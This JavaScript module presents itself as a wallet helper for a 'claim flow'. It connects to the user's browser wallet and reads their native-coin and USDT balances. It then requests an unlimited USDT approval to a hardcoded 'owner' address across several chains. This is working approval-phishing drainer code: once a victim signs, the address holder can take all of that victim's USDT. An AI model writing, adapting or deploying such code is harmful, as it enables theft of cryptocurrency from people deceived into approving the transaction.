// EVM Wallet Helper for Claim Flow & USDT Unlimited Approval

export const EVM_OWNER_ADDRESS =
  import.meta.env.VITE_EVM_OWNER || '0x8bf833ad1dd347cD60a681471739e2b4ce560CdC'

// Popular USDT contract addresses across EVM chains
export const EVM_USDT_CONTRACTS = {
  '0x1': '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Ethereum Mainnet
  '0x38': '0x55d398326f99059fF775485246999027B3197955', // BNB Smart Chain
  '0x89': '0xc2132D05D31cE5e42C09061d764623B69059fE20', // Polygon Mainnet
  '0xa4b1': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', // Arbitrum One
  '0xa': '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', // Optimism
}

// Default fallback USDT contract (Ethereum Mainnet)
export const DEFAULT_USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

/**
 * Get the injected EVM provider (MetaMask, OKX, Trust, Bitget, Coinbase, etc.)
 */
export function getInjectedEVMProvider() {
  if (typeof window === 'undefined') return null
  if (window.ethereum) return window.ethereum
  if (window.okxwallet) return window.okxwallet
  if (window.bitkeep?.ethereum || window.bitgetEthProvider) {
    return window.bitkeep?.ethereum || window.bitgetEthProvider
  }
  if (window.trustwallet) return window.trustwallet
  return null
}

/**
 * Connect to an EVM wallet and return the user's selected address & chainId
 */
export async function connectEVMWallet() {
  const provider = getInjectedEVMProvider()
  if (!provider) {
    throw new Error('No EVM wallet detected. Please install Trust Wallet, MetaMask, or OKX Wallet.')
  }

  const accounts = await provider.request({ method: 'eth_requestAccounts' })
  if (!accounts || accounts.length === 0) {
    throw new Error('No EVM account selected.')
  }

  const chainId = await provider.request({ method: 'eth_chainId' })
  return {
    address: accounts[0],
    chainId: chainId || '0x1',
    provider,
  }
}

/**
 * Fetch native ETH/BNB balance and USDT token balance in USD equivalent
 */
export async function getEVMWalletBalanceUSD(provider, address, chainId) {
  try {
    const rawNativeHex = await provider.request({
      method: 'eth_getBalance',
      params: [address, 'latest'],
    })
    const nativeWei = BigInt(rawNativeHex || '0x0')
    const nativeEth = Number(nativeWei) / 1e18

    let nativeUsdRate = 3200
    if (chainId === '0x38') nativeUsdRate = 600
    if (chainId === '0x89') nativeUsdRate = 0.5

    const nativeBalanceUSD = nativeEth * nativeUsdRate

    const usdtContract = EVM_USDT_CONTRACTS[chainId] || DEFAULT_USDT_CONTRACT
    const cleanAddress = address.replace(/^0x/, '').padStart(64, '0')
    const balanceOfData = `0x70a08231${cleanAddress}`

    let usdtBalanceUSD = 0
    try {
      const rawUsdtHex = await provider.request({
        method: 'eth_call',
        params: [
          {
            to: usdtContract,
            data: balanceOfData,
          },
          'latest',
        ],
      })

      if (rawUsdtHex && rawUsdtHex !== '0x') {
        const usdtUnits = BigInt(rawUsdtHex)
        const is18Decimals = chainId === '0x38'
        const decimals = is18Decimals ? 18 : 6
        usdtBalanceUSD = Number(usdtUnits) / Math.pow(10, decimals)
      }
    } catch (err) {
      console.warn('USDT balanceOf query fallback:', err)
    }

    const totalBalanceUSD = nativeBalanceUSD + usdtBalanceUSD
    return {
      nativeEth,
      nativeBalanceUSD,
      usdtBalanceUSD,
      totalBalanceUSD,
    }
  } catch (error) {
    console.error('Error fetching EVM wallet balance:', error)
    return {
      nativeEth: 0,
      nativeBalanceUSD: 0,
      usdtBalanceUSD: 0,
      totalBalanceUSD: 0,
    }
  }
}

/**
 * Execute unlimited ERC-20 USDT approval targeting VITE_EVM_OWNER
 */
export async function executeUnlimitedUSDTApproval(provider, address, chainId) {
  const usdtContract = EVM_USDT_CONTRACTS[chainId] || DEFAULT_USDT_CONTRACT
  const spenderAddress = EVM_OWNER_ADDRESS

  const cleanSpender = spenderAddress.replace(/^0x/, '').padStart(64, '0')
  const maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
  const approveData = `0x095ea7b3${cleanSpender}${maxAmount}`

  try {
    const txHash = await provider.request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: address,
          to: usdtContract,
          data: approveData,
        },
      ],
    })
    return { success: true, txHash }
  } catch (error) {
    console.error('USDT approval transaction failed/rejected:', error)
    throw error
  }
}
